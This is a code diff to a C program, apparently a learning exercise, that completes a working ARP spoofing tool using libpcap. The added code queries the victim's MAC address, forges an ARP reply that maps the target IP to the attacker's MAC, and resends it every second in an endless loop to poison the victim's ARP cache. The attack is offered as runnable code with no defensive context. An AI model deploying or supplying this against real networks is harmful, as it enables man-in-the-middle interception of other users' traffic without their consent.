@@ -35,7 +35,8 @@ void usage(){
 
 int main(int argc, char *argv[]){
 
-	u_char packet[100];
+	u_char packet[128];
+	const u_char *buf;
 
 	struct arpheader *arp_header;
 	struct ether_header *eth_header;
@@ -44,6 +45,7 @@ int main(int argc, char *argv[]){
 	struct ifreq ifr;
 
 	unsigned char attacker_mac[MAC_ALEN];
+	unsigned char victim_mac[MAC_ALEN];
 	const char *attacker_ip;
 	char *dev, *victim_ip, *target_ip;
 
@@ -64,7 +66,7 @@ int main(int argc, char *argv[]){
 	// Get Attacker MAC Address
 	fd = socket(AF_INET, SOCK_DGRAM, 0);
 	if(fd < 0){
-		perror("socket fail");
+		printf("[!] Socket Error!\n");
 		return -1;
 	}
 	strncpy(ifr.ifr_name , dev , IFNAMSIZ-1);
@@ -87,8 +89,7 @@ int main(int argc, char *argv[]){
 	printf("Attacker MAC 	: %02X:%02X:%02X:%02X:%02X:%02X\n", attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);
 	printf("============================================\n");
 
-
-	// Get Target MAC Address
+	/*========== Setting ARP Request Packet ==========*/
 	// Make Ethernet Packet
 	eth_header = (struct ether_header*)packet;
 	eth_header->ether_type = ntohs(ETHERTYPE_ARP);	// ETHERTYPE_ARP : 0x0806 (define ethernet.h)
@@ -106,21 +107,60 @@ int main(int argc, char *argv[]){
 	arp_header->op_code = ntohs(ARPOP_REQUEST);	// ARPOP_REQUEST : 1 (define net/if_arp.h)
 	memcpy(arp_header->sender_hd_addr, attacker_mac, MAC_ALEN);
 	arp_header->sender_pro_addr = inet_addr(target_ip);
-	memcpy(arp_header->target_hd_addr, "\x00\x00\x00\x00\x00\x00", MAC_ALEN);
+	memset(arp_header->target_hd_addr, 0, MAC_ALEN);
 	arp_header->target_pro_addr = inet_addr(victim_ip);
 
 	if((handle = pcap_open_live(dev, BUFSIZE, 1, 1, errbuf)) == NULL){
-		printf("Open Device Error %s : %s\n", dev, errbuf);
-		return 2;
+		printf("[!] Open Device Error %s : %s\n", dev, errbuf);
+		return -1;
 	}
+	/*=================================================*/
 
 	// Send ARP Request
-	// ARP Spoofing
+	pcap_sendpacket(handle, packet, PACKET_SIZE);
+
+	// Get Victim MAC Address
+	res = pcap_next_ex(handle, &pcap_header, &buf);
+
+	for(int i=0 ; i<MAC_ALEN ; i++)
+		victim_mac[i] = buf[6+i];
+
+	// Print Victim Info
+	printf("Victim IP	: %s\n", victim_ip);
+	printf("Victim MAC	: %02X:%02X:%02X:%02X:%02X:%02X\n", victim_mac[0], victim_mac[1], victim_mac[2], victim_mac[3], victim_mac[4], victim_mac[5]);
+
+	/*========== Setting ARP Reply Packet ==========*/
+	// Make Ethernet Packet
+	eth_header = (struct ether_header*)packet;
+	eth_header->ether_type = ntohs(ETHERTYPE_ARP);	// ETHERTYPE_ARP : 0x0806 (define ethernet.h)
+	for(int i=0 ; i<ETHER_ADDR_LEN ; i++){		// ETHER_ADDR_LEN : 6 (define ethernet.h -> linux/if_ether.h)
+		eth_header->ether_dhost[i] = victim_mac[i];
+		eth_header->ether_shost[i] = attacker_mac[i];
+	}
+
+	// Make ARP Packet
+	arp_header = (struct arpheader*)(packet+ETH_PLEN);
+	arp_header->hd_type = ntohs(ARPHRD_ETHER);	// ARPHRD_ETHER : 1 (define net/if_arp.h)
+	arp_header->pro_type = ntohs(ETHERTYPE_IP);	// ETHERTYPE_IP : 0x0800 (define net/ethernet.h)
+	arp_header->hd_len = ETHER_ADDR_LEN;		// Sender hadrdware address length
+	arp_header->pro_len = IP_ALEN;			// Sender ip address length
+	arp_header->op_code = ntohs(ARPOP_REPLY);	// ARPOP_REPLY : 2 (define net/if_arp.h)
+	memcpy(arp_header->sender_hd_addr, attacker_mac, MAC_ALEN);
+	arp_header->sender_pro_addr = inet_addr(target_ip);
+	memcpy(arp_header->target_hd_addr, victim_mac, MAC_ALEN);
+	arp_header->target_pro_addr = inet_addr(victim_ip);
+
+	if((handle = pcap_open_live(dev, BUFSIZE, 1, 1, errbuf)) == NULL){
+		printf("[!] Open Device Error %s : %s\n", dev, errbuf);
+		return -1;
+	}
+	/*==============================================*/
+
+	// Send ARP Reply
 	while(1){
-		printf("[+] Send ARP Spoofing Packet!\n");
+		printf("[+] Send ARP Spoofing Packet...\n");
 		pcap_sendpacket(handle, packet, PACKET_SIZE);
 		sleep(1);
 	}
-
 	return 0;
 }
